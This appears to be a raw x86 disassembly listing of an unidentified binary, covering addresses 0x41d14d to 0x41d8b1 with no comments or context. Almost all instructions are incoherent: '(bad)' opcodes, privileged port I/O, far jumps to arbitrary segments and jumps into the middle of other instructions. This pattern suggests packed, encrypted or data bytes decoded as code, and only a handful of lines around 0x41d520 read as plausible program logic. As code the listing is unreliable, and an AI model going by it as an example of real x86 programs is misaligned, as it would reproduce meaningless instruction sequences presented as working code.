  41d14d:	jmp    0x41d51c
  41d152:	lahf   
  41d153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d154:	out    dx,eax
  41d155:	cdq    
  41d156:	out    dx,eax
  41d157:	inc    ecx
  41d158:	push   ds
  41d159:	push   ds
  41d15a:	mov    eax,0x8abc6585
  41d15f:	dec    esp
  41d160:	outs   dx,DWORD PTR ds:[esi]
  41d161:	mov    al,0x36
  41d163:	pop    ebp
  41d164:	push   ss
  41d165:	sbb    BYTE PTR [edx+edx*1+0xeb81818],bh
  41d16c:	ja     0x41d19d
  41d16e:	das    
  41d16f:	mov    bl,0x1a
  41d171:	mov    ebx,0x7d68ad4a
  41d176:	es dec edx
  41d178:	shl    BYTE PTR [ebx],0xe7
  41d17b:	and    BYTE PTR [esi-0xd0479e9],ch
  41d181:	cmp    ch,dl
  41d183:	pop    eax
  41d184:	xor    eax,0xe42ec735
  41d189:	jl     0x41d15b
  41d18b:	jl     0x41d14e
  41d18d:	rol    BYTE PTR [edi+0x78],1
  41d190:	shr    DWORD PTR [ebx],1
  41d192:	ins    BYTE PTR es:[edi],dx
  41d193:	std    
  41d194:	jge    0x41d1cb
  41d196:	cmp    dh,bl
  41d198:	xchg   ebx,eax
  41d199:	dec    eax
  41d19a:	cmp    BYTE PTR [esi-0x4],dh
  41d19d:	aam    0x8
  41d19f:	add    eax,0x59d96eda
  41d1a4:	inc    ebp
  41d1a5:	xchg   ecx,eax
  41d1a6:	cli    
  41d1a7:	sti    
  41d1a8:	in     eax,dx
  41d1a9:	xchg   ecx,eax
  41d1aa:	data16 and BYTE PTR [bp+di],dl
  41d1ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1af:	loope  0x41d15f
  41d1b1:	call   0xaa712dc5
  41d1b6:	sti    
  41d1b7:	or     al,ch
  41d1b9:	stc    
  41d1ba:	adc    esp,DWORD PTR [ecx+ebx*8+0x18ee056d]
  41d1c1:	and    DWORD PTR [edi],ebx
  41d1c3:	xor    eax,0x1a7159ef
  41d1c8:	retf   
  41d1c9:	dec    ebx
  41d1ca:	dec    esp
  41d1cb:	cmp    al,0xae
  41d1cd:	pusha  
  41d1ce:	or     eax,0xbdf39d51
  41d1d3:	cld    
  41d1d4:	add    ecx,eax
  41d1d6:	pop    ebp
  41d1d8:	hlt    
  41d1d9:	test   eax,0xad3eb7ba
  41d1de:	xchg   ebx,eax
  41d1df:	rol    ecx,cl
  41d1e1:	fiadd  WORD PTR [edx+ebp*1+0x3a]
  41d1e5:	mov    eax,DWORD PTR [eax+0x434d7c23]
  41d1eb:	fwait
  41d1ec:	dec    DWORD PTR [eax]
  41d1ee:	adc    al,BYTE PTR [ebx-0x20]
  41d1f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1f2:	outs   dx,BYTE PTR ds:[esi]
  41d1f3:	pop    ecx
  41d1f4:	gs (bad) 
  41d1f6:	cmc    
  41d1f7:	sub    eax,0x83640815
  41d1fc:	shr    BYTE PTR [eax+0x661733e6],0x38
  41d203:	loope  0x41d25f
  41d205:	adc    al,0x28
  41d207:	outs   dx,DWORD PTR ds:[esi]
  41d208:	stc    
  41d209:	jns    0x41d25b
  41d20b:	pop    es
  41d20c:	or     esp,edx
  41d20e:	pusha  
  41d20f:	push   cs
  41d210:	retf   
  41d211:	jp     0x41d1ec
  41d213:	dec    ecx
  41d214:	les    ebp,FWORD PTR [edx+ebp*8+0x638474b8]
  41d21b:	dec    esi
  41d21c:	inc    edi
  41d21d:	sub    bl,BYTE PTR [ebx-0xbbdf485]
  41d223:	push   edi
  41d224:	ss pop esp
  41d226:	outs   dx,BYTE PTR ds:[esi]
  41d227:	imul   esp,DWORD PTR [ecx-0x7f],0x2c1ce434
  41d22e:	enter  0x99e,0x6d
  41d232:	mov    ebx,0x87d0ddb1
  41d237:	xchg   ecx,eax
  41d238:	dec    ebp
  41d239:	mov    ecx,0x5d4a9483
  41d23e:	inc    edx
  41d23f:	popa   
  41d240:	add    DWORD PTR [esi+eax*8],0x62
  41d244:	into   
  41d245:	fwait
  41d246:	gs ins BYTE PTR es:[edi],dx
  41d248:	sahf   
  41d249:	ret    0xf9a
  41d24c:	sub    edx,DWORD PTR [edx]
  41d24e:	enter  0x86e1,0x4c
  41d252:	xor    DWORD PTR [eax-0x6],edi
  41d255:	push   es
  41d256:	iret   
  41d257:	dec    esi
  41d258:	pop    esi
  41d259:	ja     0x41d299
  41d25b:	push   0x94c43b85
  41d260:	ficom  WORD PTR [edi+0x64]
  41d263:	rcl    BYTE PTR [edi+0x188b571c],1
  41d269:	es into 
  41d26b:	or     al,bh
  41d26d:	or     al,dl
  41d26f:	mov    eax,ds:0x162d9e06
  41d274:	mul    DWORD PTR [edi+0x7c]
  41d277:	mov    ebp,0x542e480e
  41d27c:	loopne 0x41d28c
  41d27e:	daa    
  41d27f:	lods   eax,DWORD PTR cs:[esi]
  41d281:	pop    ds
  41d282:	adc    eax,0x9bf05c0
  41d287:	cmp    dh,bh
  41d289:	jg     0x41d24f
  41d28b:	je     0x41d23d
  41d28d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d28e:	(bad)  
  41d290:	xchg   edx,eax
  41d291:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d292:	mov    ds:0x644ed6ec,al
  41d297:	jge    0x41d2e8
  41d299:	out    0x24,eax
  41d29b:	(bad)  
  41d29c:	ficomp WORD PTR [ecx+0x21aa2e6b]
  41d2a2:	xchg   ebp,eax
  41d2a3:	in     al,0x51
  41d2a5:	outs   dx,BYTE PTR ds:[esi]
  41d2a6:	or     BYTE PTR [edx+0x80e2472],dl
  41d2ac:	add    DWORD PTR [ebx],esp
  41d2ae:	jno    0x41d2a8
  41d2b0:	lods   eax,DWORD PTR ds:[esi]
  41d2b1:	adc    ch,0x72
  41d2b4:	push   ss
  41d2b5:	(bad)  
  41d2b7:	(bad)  
  41d2b8:	rol    DWORD PTR [eax-0x2714f3e3],1
  41d2be:	(bad)  
  41d2bf:	outs   dx,DWORD PTR ds:[esi]
  41d2c0:	fs fwait
  41d2c2:	ins    BYTE PTR es:[edi],dx
  41d2c3:	repnz cwde 
  41d2c5:	dec    ebx
  41d2c6:	jae    0x41d2f1
  41d2c8:	pushf  
  41d2c9:	fbstp  TBYTE PTR [ecx+0x5a]
  41d2cc:	dec    esi
  41d2cd:	inc    ebp
  41d2ce:	mov    DWORD PTR [ebx+eax*8],ebx
  41d2d1:	cs scas al,BYTE PTR es:[edi]
  41d2d3:	jp     0x41d27c
  41d2d5:	test   dl,dh
  41d2d7:	xchg   ecx,eax
  41d2d8:	sbb    DWORD PTR [edx-0x62],edi
  41d2db:	test   DWORD PTR [edx-0x3],ebx
  41d2de:	and    DWORD PTR ds:0xc8b73aff,esi
  41d2e4:	cld    
  41d2e5:	inc    esi
  41d2e6:	adc    eax,0x712b139
  41d2eb:	dec    ecx
  41d2ec:	mov    bh,bl
  41d2ee:	aam    0x7b
  41d2f0:	lea    ecx,[edi]
  41d2f2:	in     eax,0x66
  41d2f4:	xor    cl,BYTE PTR [eax]
  41d2f6:	and    al,0x29
  41d2f8:	frstor [ebp-0xd16703e]
  41d2fe:	jbe    0x41d30e
  41d300:	sub    bh,al
  41d302:	add    bl,bh
  41d304:	pop    es
  41d305:	adc    eax,0x9fe51c78
  41d30a:	push   esp
  41d30b:	sti    
  41d30c:	sbb    al,0xe2
  41d30e:	jecxz  0x41d36e
  41d310:	pop    ecx
  41d311:	cld    
  41d312:	jo     0x41d333
  41d314:	fwait
  41d315:	rol    BYTE PTR [ecx],1
  41d317:	and    al,0x99
  41d319:	and    ah,bh
  41d31b:	pop    ds
  41d31c:	int3   
  41d31d:	ins    DWORD PTR es:[edi],dx
  41d31e:	inc    ebx
  41d31f:	popa   
  41d320:	mov    ss,esp
  41d322:	mov    DWORD PTR [edx+0x63],eax
  41d325:	adc    BYTE PTR [eax],dh
  41d327:	pop    edx
  41d328:	inc    ebx
  41d329:	adc    edi,DWORD PTR [ebp+esi*4+0x34f1ea88]
  41d330:	scas   eax,DWORD PTR es:[edi]
  41d331:	mov    eax,0xb1d8d8c1
  41d336:	gs inc esp
  41d338:	mov    dl,0x1e
  41d33a:	dec    esi
  41d33b:	jno    0x41d347
  41d33d:	sahf   
  41d33e:	cmp    esp,eax
  41d340:	push   es
  41d341:	in     al,0x4f
  41d343:	push   esp
  41d344:	add    ecx,eax
  41d346:	fs push ds
  41d348:	jo     0x9d54a7e4
  41d34e:	xor    ch,BYTE PTR [esi]
  41d350:	and    ah,al
  41d352:	xchg   DWORD PTR [eax+0x6d],edx
  41d355:	mov    esi,0x6a934031
  41d35a:	enter  0xa0e0,0xf3
  41d35e:	jmp    0x41d32d
  41d360:	iret   
  41d361:	ins    BYTE PTR es:[edi],dx
  41d362:	mov    ebp,0x87f7b9d7
  41d367:	loope  0x41d3b7
  41d369:	add    al,0x5c
  41d36b:	sbb    dh,ah
  41d36d:	xor    eax,0x6b7f2180
  41d372:	xor    al,0x94
  41d374:	mov    al,0x48
  41d376:	jae    0x41d303
  41d378:	sub    DWORD PTR [esi],edi
  41d37a:	rol    DWORD PTR [ecx+ebx*2+0x42],1
  41d37e:	call   0x665e:0xd34aeaa2
  41d385:	test   edi,ebp
  41d387:	jmp    0x7d50:0x15762c53
  41d38e:	mov    ebx,0x40b4b564
  41d393:	adc    DWORD PTR [esi+esi*4-0x57],0x17
  41d398:	das    
  41d399:	loop   0x41d323
  41d39b:	sbb    DWORD PTR [edi+0x2d],0x6f9f61b6
  41d3a2:	pop    ss
  41d3a3:	mov    ?,WORD PTR [edx-0x5a]
  41d3a6:	jne    0x41d405
  41d3a8:	fwait
  41d3a9:	rcr    BYTE PTR [ebp-0x56],cl
  41d3ac:	and    eax,0xd58daed1
  41d3b1:	cmc    
  41d3b2:	popa   
  41d3b3:	jbe    0x41d38f
  41d3b5:	inc    ebp
  41d3b6:	gs pop esp
  41d3b8:	sub    eax,0x4be94acb
  41d3bd:	pop    eax
  41d3be:	jmp    0x41d34a
  41d3c0:	cmp    eax,0xb76e5a
  41d3c5:	cmp    DWORD PTR [edx+0x1e7f59d1],ecx
  41d3cb:	arpl   cx,bp
  41d3cd:	std    
  41d3ce:	mov    bh,0x80
  41d3d0:	xchg   edi,eax
  41d3d1:	arpl   WORD PTR [edx],dx
  41d3d3:	sbb    bh,BYTE PTR [edx*1-0x2d3f9c7e]
  41d3da:	daa    
  41d3db:	imul   BYTE PTR [ecx-0x646c22eb]
  41d3e1:	ficomp WORD PTR [ebp+0x8f159c7]
  41d3e7:	add    eax,0xf43fef7b
  41d3ec:	bound  esp,QWORD PTR [esi-0x4e42456b]
  41d3f2:	dec    esi
  41d3f3:	cwde   
  41d3f4:	aad    0xf7
  41d3f6:	push   0x2
  41d3f8:	retf   0x75c6
  41d3fb:	out    dx,al
  41d3fc:	pop    ss
  41d3fd:	loope  0x41d448
  41d3ff:	sub    al,0xf3
  41d401:	mov    cl,0xe1
  41d403:	or     ebx,DWORD PTR [esp+edi*1]
  41d406:	inc    esi
  41d407:	dec    ebx
  41d408:	daa    
  41d409:	mov    ecx,0x430640ac
  41d40e:	dec    eax
  41d40f:	cwde   
  41d410:	imul   esp,DWORD PTR [ebx],0xe86606ae
  41d416:	ret    
  41d417:	(bad)  [edx-0x31bacd50]
  41d41d:	mov    ah,0x29
  41d41f:	dec    al
  41d421:	sbb    dl,BYTE PTR [edx+0x3d]
  41d424:	dec    ebp
  41d425:	shl    BYTE PTR [edx],0x27
  41d428:	or     al,0x9e
  41d42a:	dec    edi
  41d42b:	and    DWORD PTR [ecx+0x3d86c512],esi
  41d431:	cmp    al,BYTE PTR [ecx+0x28]
  41d434:	popf   
  41d435:	outs   dx,DWORD PTR ds:[esi]
  41d436:	xor    cl,0xd3
  41d439:	addr16 out dx,eax
  41d43b:	fs out 0x1d,al
  41d43e:	push   esp
  41d43f:	pop    eax
  41d440:	scas   eax,DWORD PTR es:[edi]
  41d441:	pop    esi
  41d442:	popf   
  41d443:	push   ecx
  41d444:	cmp    eax,0x2e5b1ef8
  41d449:	ss sbb dl,dh
  41d44c:	xchg   ebx,eax
  41d44d:	clc    
  41d44e:	lods   al,BYTE PTR ds:[esi]
  41d44f:	inc    esi
  41d450:	adc    eax,0xf2440617
  41d455:	in     eax,dx
  41d456:	call   0xc625:0x712e4db3
  41d45d:	mov    al,0x28
  41d45f:	neg    ah
  41d461:	inc    esi
  41d462:	daa    
  41d463:	dec    ebx
  41d464:	cmc    
  41d465:	jmp    0x41d3fb
  41d467:	inc    eax
  41d468:	jnp    0x41d458
  41d46a:	lea    esi,[esi+ecx*8]
  41d46d:	fidiv  WORD PTR [edx-0x4a]
  41d470:	leave  
  41d471:	sbb    ebx,DWORD PTR [ecx+0x1f]
  41d474:	retf   
  41d475:	not    DWORD PTR [edi+eiz*2]
  41d478:	add    al,0xdc
  41d47a:	addr16 jmp 0x9d7f49ed
  41d480:	cmc    
  41d481:	sbb    eax,0x1eabb134
  41d486:	imul   esi,DWORD PTR [eax],0x6410af8
  41d48c:	(bad)
  41d490:	and    BYTE PTR [esi],bl
  41d492:	dec    di
  41d494:	in     al,dx
  41d495:	sahf   
  41d496:	fdiv   QWORD PTR [esi+0xdc28500]
  41d49c:	lods   eax,DWORD PTR ds:[esi]
  41d49d:	sbb    al,0x80
  41d49f:	cmp    DWORD PTR [eax-0x6f],ecx
  41d4a2:	adc    bh,BYTE PTR [esp+eax*8]
  41d4a5:	push   edi
  41d4a6:	mov    ebx,0x7d34dcf6
  41d4ab:	shl    esi,cl
  41d4ad:	sbb    bl,dl
  41d4af:	icebp  
  41d4b0:	cwde   
  41d4b1:	sub    dl,BYTE PTR [ebx]
  41d4b3:	add    eax,0xcacaf1c4
  41d4b8:	retf   0xbc0
  41d4bb:	ja     0x41d51c
  41d4bd:	dec    edx
  41d4be:	and    eax,0x69fd9547
  41d4c3:	sbb    al,0x30
  41d4c5:	or     ch,BYTE PTR [ecx+0x22]
  41d4c8:	inc    BYTE PTR [edx]
  41d4ca:	push   eax
  41d4cb:	in     al,0x1b
  41d4cd:	mov    ss,ebx
  41d4cf:	aam    0xe6
  41d4d1:	jmp    0x41d4a3
  41d4d3:	(bad)  
  41d4d4:	test   edi,0x7e560a45
  41d4da:	out    0xf8,al
  41d4dc:	mov    ecx,0x1eb2ba1f
  41d4e1:	gs jl  0x41d4fb
  41d4e4:	es push ebp
  41d4e6:	jne    0x41d502
  41d4e8:	dec    ebx
  41d4e9:	jg     0x41d4b1
  41d4eb:	mov    al,0x28
  41d4ed:	mov    eax,0x7ecc6028
  41d4f2:	jbe    0x41d531
  41d4f4:	icebp  
  41d4f5:	mov    esi,0x6115132e
  41d4fa:	pop    esi
  41d4fb:	pusha  
  41d4fc:	(bad)  
  41d4fd:	leave  
  41d4fe:	ins    DWORD PTR es:[edi],dx
  41d4ff:	mov    bl,0x7
  41d501:	mov    ebx,0x4f790f61
  41d506:	imul   ebp,DWORD PTR ds:0x942fc353,0x48c5e829
  41d510:	push   ecx
  41d511:	das    
  41d512:	cmp    eax,DWORD PTR [edx]
  41d514:	push   ds
  41d515:	and    al,cl
  41d517:	adc    ah,BYTE PTR [esi+0x17]
  41d51a:	lods   eax,DWORD PTR ds:[esi]
  41d51b:	jl     0x41d52c
  41d51d:	test   DWORD PTR [esp+eax*1],eax
  41d520:	add    BYTE PTR [eax],al
  41d522:	cmp    edx,esi
  41d524:	jne    0x41d926
  41d52a:	xor    eax,eax
  41d52c:	jmp    0x41e9f0
  41d531:	mov    eax,DWORD PTR [esp+0x70]
  41d535:	mov    ecx,DWORD PTR [esp+0x74]
  41d539:	jmp    0x41d908
  41d53e:	ss lahf 
  41d540:	xchg   ebp,eax
  41d541:	sbb    al,0x7c
  41d543:	sbb    bl,BYTE PTR [esi]
  41d545:	fwait
  41d546:	push   ebx
  41d547:	out    0xc5,eax
  41d549:	jl     0x41d550
  41d54b:	fwait
  41d54c:	in     al,dx
  41d54d:	mov    esi,0x181655da
  41d552:	mov    esp,0x11181812
  41d557:	pop    ecx
  41d558:	pop    ebp
  41d559:	clc    
  41d55a:	or     al,0x8a
  41d55c:	loope  0x41d569
  41d55e:	push   esp
  41d55f:	sub    edx,edx
  41d561:	push   cs
  41d562:	(bad)  
  41d563:	xor    BYTE PTR [edx+0x7bc708c0],al
  41d569:	enter  0x371d,0xa
  41d56d:	cmp    BYTE PTR [ebp-0x24],al
  41d570:	fdivr  DWORD PTR [ebx-0x4261a43]
  41d576:	outs   dx,BYTE PTR ds:[esi]
  41d577:	in     eax,0xe6
  41d579:	enter  0xeb97,0x3d
  41d57d:	retf   0xa095
  41d580:	fdiv   DWORD PTR [ebp-0x1b449ef6]
  41d587:	retf   0x6ef3
  41d58a:	jmp    0xa68ab447
  41d58f:	add    al,0x88
  41d591:	aas    
  41d592:	dec    ebx
  41d593:	out    0xe1,eax
  41d595:	fs ror eax,1
  41d598:	push   eax
  41d599:	push   ds
  41d59a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d59b:	je     0x41d573
  41d59d:	sbb    DWORD PTR [ebx-0x2d23afab],0x273b4895
  41d5a7:	dec    edx
  41d5a8:	call   DWORD PTR [eax-0x50b44704]
  41d5ae:	into   
  41d5af:	shr    al,cl
  41d5b1:	dec    esp
  41d5b2:	add    BYTE PTR [ebp+edx*4-0x400e9132],al
  41d5b9:	add    al,0x3c
  41d5bb:	dec    ebx
  41d5bc:	jge    0x41d626
  41d5be:	sbb    al,0x65
  41d5c0:	dec    eax
  41d5c1:	cdq    
  41d5c2:	add    DWORD PTR [esi+ecx*1],edi
  41d5c5:	icebp  
  41d5c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5c7:	mov    ecx,0xacb1ebf1
  41d5cc:	nop
  41d5cd:	xchg   edx,eax
  41d5ce:	sub    al,0x8a
  41d5d0:	mov    gs,WORD PTR [ecx]
  41d5d2:	fisttp WORD PTR [esi+0x47]
  41d5d5:	inc    edx
  41d5d6:	aam    0xc5
  41d5d8:	cwde   
  41d5d9:	inc    ebp
  41d5da:	mov    DWORD PTR ds:0x1c8779a8,0x27c192a7
  41d5e4:	ret    0x334e
  41d5e7:	cmp    al,0x1c
  41d5e9:	add    BYTE PTR [edx+esi*2+0x24],bl
  41d5ed:	mov    esp,0xffe87fc9
  41d5f2:	fwait
  41d5f3:	out    dx,eax
  41d5f4:	dec    ebx
  41d5f5:	js     0x41d604
  41d5f7:	ret    0x979f
  41d5fa:	out    0x84,al
  41d5fc:	xchg   edi,eax
  41d5fd:	cvtpi2ps xmm0,QWORD PTR [esi+0x1860f08e]
  41d604:	out    dx,al
  41d605:	idiv   BYTE PTR [ebx+0xca4b4da]
  41d60b:	pop    esp
  41d60c:	call   0xbdb5:0xbe92d345
  41d613:	add    eax,0xd17400f8
  41d618:	push   cs
  41d619:	das    
  41d61a:	jmp    0x34c4:0x4c2919c9
  41d621:	dec    ecx
  41d622:	dec    eax
  41d623:	or     esi,DWORD PTR [eax]
  41d625:	cmp    BYTE PTR [ecx-0x3d07cd71],bh
  41d62b:	in     al,dx
  41d62c:	pop    eax
  41d62d:	out    0xb6,eax
  41d62f:	rcr    DWORD PTR [esi],1
  41d631:	stos   BYTE PTR es:[edi],al
  41d632:	xchg   esi,eax
  41d633:	shl    al,cl
  41d635:	test   BYTE PTR [edi+ecx*1+0x1f],dh
  41d639:	hlt    
  41d63a:	aam    0x6
  41d63c:	push   esi
  41d63d:	in     eax,dx
  41d63e:	jne    0x41d6a8
  41d640:	in     eax,0xee
  41d642:	es xor ch,ah
  41d645:	test   al,0x54
  41d647:	jmp    0xddb0:0xe561f23a
  41d64e:	inc    ecx
  41d64f:	or     al,0xb4
  41d651:	cwde   
  41d652:	mov    edi,DWORD PTR [ecx-0x6228c61e]
  41d658:	pop    edx
  41d659:	js     0x41d65d
  41d65b:	pushf  
  41d65c:	cmp    BYTE PTR [ecx],dh
  41d65e:	xor    bh,BYTE PTR [eax-0x4c20dfb9]
  41d664:	pop    ds
  41d665:	push   esi
  41d666:	mov    bl,0x11
  41d668:	push   ebp
  41d669:	sbb    DWORD PTR [esi-0x4f],eax
  41d66c:	fstp   DWORD PTR [esi]
  41d66e:	int3   
  41d66f:	mov    al,0x4d
  41d671:	mov    eax,0x57a5d143
  41d676:	ret    
  41d677:	stc    
  41d678:	out    0xc8,al
  41d67a:	shl    DWORD PTR [edi-0x70],0x8
  41d67e:	popa   
  41d67f:	push   0x5a
  41d681:	in     al,dx
  41d682:	jmp    0xf531:0xfe3d4835
  41d689:	loopne 0x41d6c6
  41d68b:	bound  ebp,QWORD PTR [ecx-0x2b568ce4]
  41d691:	int3   
  41d692:	cmp    al,0x19
  41d694:	or     DWORD PTR [esi],0xffffffe0
  41d697:	nop
  41d698:	xor    DWORD PTR [ecx+ebp*4-0x17df421b],ebx
  41d69f:	xchg   ebp,eax
  41d6a0:	inc    ebp
  41d6a1:	fwait
  41d6a2:	add    ebp,DWORD PTR [edx+ecx*8+0x41]
  41d6a6:	and    al,0x16
  41d6a8:	test   BYTE PTR [eax],al
  41d6aa:	add    dl,BYTE PTR [ebp-0x63e08352]
  41d6b0:	nop
  41d6b1:	imul   esi,DWORD PTR [esp+esi*2+0x2c],0xffffffb0
  41d6b6:	fiadd  DWORD PTR [edi]
  41d6b8:	addr16 mov ds:0xc4b5,eax
  41d6bc:	call   FWORD PTR [edi]
  41d6be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6bf:	or     eax,0x68c1322c
  41d6c4:	in     eax,dx
  41d6c5:	leave  
  41d6c6:	xchg   edi,eax
  41d6c7:	and    ch,BYTE PTR [eax+0x5cb25de]
  41d6cd:	sbb    al,BYTE PTR [ebx-0x59ae0ac4]
  41d6d3:	ins    BYTE PTR es:[edi],dx
  41d6d4:	pop    edi
  41d6d5:	pop    es
  41d6d6:	xchg   edx,eax
  41d6d7:	stos   BYTE PTR es:[edi],al
  41d6d8:	imul   ecx,DWORD PTR [ebx],0x634d8c1
  41d6de:	inc    ebx
  41d6df:	xchg   esp,eax
  41d6e0:	dec    edi
  41d6e1:	mov    esi,0x40a20273
  41d6e6:	test   al,0xcf
  41d6e8:	pushf  
  41d6e9:	xchg   ecx,eax
  41d6ea:	sar    DWORD PTR [edi+0x1a],cl
  41d6ed:	push   esp
  41d6ee:	push   ebx
  41d6ef:	in     al,0xc4
  41d6f1:	out    0x28,al
  41d6f3:	xor    edx,esp
  41d6f5:	push   esp
  41d6f6:	pop    es
  41d6f7:	xor    BYTE PTR [ecx+0x4369abc7],bh
  41d6fd:	and    bh,ah
  41d6ff:	or     eax,DWORD PTR [esi+0x4a]
  41d702:	loopne 0x41d6bb
  41d704:	enter  0x8d40,0xca
  41d708:	sti    
  41d709:	jae    0x41d6b0
  41d70b:	cmp    al,0xab
  41d70d:	push   ebp
  41d70e:	jae    0x41d70e
  41d710:	push   0xffffffc2
  41d712:	cmp    ch,0xcb
  41d715:	dec    esi
  41d716:	dec    ecx
  41d717:	cmp    bl,BYTE PTR [esi+0x30]
  41d71a:	push   0xbe5d94
  41d71f:	test   ebp,ebx
  41d721:	xchg   WORD PTR [ebp+0x43],ax
  41d725:	inc    esi
  41d726:	rol    BYTE PTR [ebx-0x48f3bd02],cl
  41d72c:	add    edx,DWORD PTR [edx-0x3d]
  41d72f:	or     DWORD PTR [ebx+ebp*4+0x60693a12],edi
  41d736:	cwde   
  41d737:	and    al,0xa9
  41d739:	scas   eax,DWORD PTR es:[edi]
  41d73a:	add    al,0xc0
  41d73c:	pop    ebp
  41d73d:	push   esi
  41d73e:	xchg   edx,eax
  41d73f:	sub    BYTE PTR [eax-0xe3d8e6],ah
  41d745:	aad    0xb0
  41d747:	xor    bl,BYTE PTR [esi]
  41d749:	xchg   edi,eax
  41d74a:	adc    DWORD PTR [esi],eax
  41d74c:	sar    BYTE PTR [edx-0xd2834df],0xd6
  41d753:	fdivp  st(2),st
  41d755:	out    0xe,eax
  41d757:	in     eax,dx
  41d758:	xchg   edi,eax
  41d759:	or     bl,dl
  41d75b:	pop    eax
  41d75c:	dec    sp
  41d75e:	jne    0x41d74f
  41d760:	(bad)  
  41d761:	(bad)  
  41d762:	cli    
  41d763:	ror    cl,1
  41d765:	pop    ds
  41d766:	imul   esp,esp,0x2c8324c5
  41d76c:	stc    
  41d76d:	push   edi
  41d76e:	test   eax,0xc79ca516
  41d773:	xchg   ecx,eax
  41d774:	int3   
  41d775:	std    
  41d776:	push   0x562bf1f2
  41d77b:	imul   esi
  41d77d:	sbb    al,0x80
  41d77f:	dec    ebp
  41d780:	cs jge 0x41d7d8
  41d783:	mov    ebp,0xe424ed79
  41d788:	jl     0x41d783
  41d78a:	dec    eax
  41d78b:	pop    esi
  41d78c:	je     0x41d73f
  41d78e:	adc    esp,eax
  41d790:	push   ds
  41d791:	or     ebp,ebp
  41d793:	xor    ah,BYTE PTR [ebx]
  41d795:	cmp    BYTE PTR [edx-0x32],bh
  41d798:	mov    bl,0x52
  41d79a:	cld    
  41d79b:	xor    eax,0x831ab3b3
  41d7a0:	aam    0x89
  41d7a2:	ror    ebx,0x7e
  41d7a5:	inc    esi
  41d7a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7a7:	ds inc edi
  41d7a9:	(bad)  
  41d7aa:	xor    edx,DWORD PTR [esi]
  41d7ac:	inc    DWORD PTR [esi*8+0x39228d11]
  41d7b3:	(bad)  
  41d7b4:	out    0x17,eax
  41d7b6:	bound  ebp,QWORD PTR [edi]
  41d7b8:	inc    ebx
  41d7b9:	ins    BYTE PTR es:[edi],dx
  41d7ba:	sbb    edi,DWORD PTR [edx]
  41d7bc:	scas   eax,DWORD PTR es:[edi]
  41d7bd:	xlat   BYTE PTR ds:[ebx]
  41d7be:	xchg   DWORD PTR [ebp-0x31],ebx
  41d7c1:	adc    esp,esi
  41d7c3:	loope  0x41d803
  41d7c5:	xor    BYTE PTR ss:[ebp+0x6205eb82],al
  41d7cc:	add    esp,DWORD PTR [eax+edx*2]
  41d7cf:	in     al,0x6e
  41d7d1:	mov    ecx,0xad80cd8f
  41d7d6:	jno    0x41d799
  41d7d8:	mov    esi,edi
  41d7da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7db:	add    ch,BYTE PTR [ebp+0x53]
  41d7de:	out    dx,eax
  41d7df:	xlat   BYTE PTR ds:[ebx]
  41d7e0:	in     eax,0x77
  41d7e2:	dec    edi
  41d7e3:	shl    DWORD PTR ds:0x902effba,0x0
  41d7ea:	pop    eax
  41d7eb:	das    
  41d7ec:	loop   0x41d830
  41d7ee:	gs in  eax,0x6
  41d7f1:	push   ecx
  41d7f2:	ret    0x592d
  41d7f5:	xor    DWORD PTR [edx+0x6a8c67b4],eax
  41d7fb:	sbb    BYTE PTR [edx],ah
  41d7fd:	xchg   esi,eax
  41d7fe:	adc    al,0x1b
  41d800:	inc    esp
  41d801:	inc    esp
  41d802:	pop    esi
  41d803:	(bad)  [ebp+0x53]
  41d806:	in     eax,0xc6
  41d808:	daa    
  41d809:	pop    esp
  41d80a:	je     0x41d81d
  41d80c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d80d:	xor    BYTE PTR [ebx+ecx*1+0x51],cl
  41d811:	pop    ds
  41d812:	jmp    0x41d87a
  41d814:	mov    ebp,0x61012a9f
  41d819:	mov    ebp,0x682f0546
  41d81e:	xchg   ebp,eax
  41d81f:	cmp    dl,BYTE PTR [ebx-0x73]
  41d822:	lods   eax,DWORD PTR ds:[esi]
  41d823:	in     eax,0xa3
  41d825:	ret    0x3046
  41d828:	les    ebp,FWORD PTR [esi]
  41d82a:	(bad)  
  41d82b:	mov    esi,0x5715e69a
  41d830:	je     0x41d7d5
  41d832:	lock xchg esp,eax
  41d834:	push   eax
  41d835:	or     esi,esp
  41d837:	jle    0x41d7c9
  41d839:	test   al,0x23
  41d83b:	jmp    0x5856:0xa293f317
  41d842:	(bad)  
  41d843:	and    eax,0x99c8f563
  41d848:	adc    DWORD PTR [eax],0x42
  41d84b:	sbb    al,0x41
  41d84d:	push   edi
  41d84e:	sbb    ebx,ecx
  41d850:	test   al,0xc2
  41d852:	push   ecx
  41d853:	(bad)  
  41d854:	pop    esp
  41d855:	ret    
  41d856:	sub    esi,DWORD PTR [edi-0x448045e0]
  41d85c:	jg     0x41d804
  41d85e:	repnz add BYTE PTR [edi+0x7ae1fb5],ch
  41d865:	iret   
  41d866:	push   ss
  41d867:	xor    DWORD PTR [eax+0x53],eax
  41d86a:	add    DWORD PTR [eax-0x27b76f4f],ebx
  41d870:	leave  
  41d871:	mov    dh,0x53
  41d873:	sub    ah,ch
  41d875:	mov    WORD PTR [edx],?
  41d877:	mov    bl,0x24
  41d879:	cmc    
  41d87a:	jle    0x41d859
  41d87c:	push   ss
  41d87d:	test   BYTE PTR [edx+0x50d4100c],dh
  41d883:	out    0x3f,al
  41d885:	sbb    al,0xed
  41d887:	sti    
  41d888:	push   esi
  41d889:	or     DWORD PTR [ebp+0xe843133],eax
  41d88f:	pusha  
  41d890:	imul   eax,DWORD PTR [edi-0x662eb3ce],0x46
  41d897:	xchg   esp,eax
  41d898:	sbb    al,0xf1
  41d89a:	js     0x41d910
  41d89c:	sar    DWORD PTR [edx*4+0x55ad71d9],cl
  41d8a3:	fisttp WORD PTR [ebp-0x63322c1c]
  41d8a9:	lds    edx,FWORD PTR [esi+0x56]
  41d8ac:	pushf  
  41d8ad:	fucompp 
  41d8af:	jno    0x41d89e
  41d8b1:	rcr    BYTE PTR [edx+0x7a11d943],0x21
